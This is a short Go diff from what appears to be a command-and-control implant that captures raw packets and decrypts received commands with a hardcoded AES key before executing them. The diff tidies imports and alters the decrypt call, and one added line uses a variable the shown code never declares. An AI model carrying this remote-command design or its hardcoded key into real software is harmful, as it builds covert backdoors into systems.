@@ -5,12 +5,10 @@ import (
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
-	"crypto/rand"
 	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"fmt"
-	"io"
 	"log"
 	"net"
 	"net/http"
@@ -21,8 +19,6 @@ import (
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
-	// "github.com/oneNutW0nder/CatTails/cattails"
-	//"github.com/rphaley/c2/cattails"
 	"golang.org/x/sys/unix"
 	"golang.org/x/net/bpf"
 )
@@ -368,8 +364,9 @@ func execCommand(ciphertext string) {
 		
 		// Decrypt Packet
 		key := []byte("pooppooppooppoop")
+		tmp = []byte(ciphertext)
 		
-		command, err := decrypt(ciphertext, key)
+		command, err := decrypt(tmp, key)
 		if err != nil {
 			panic(err)
 		}
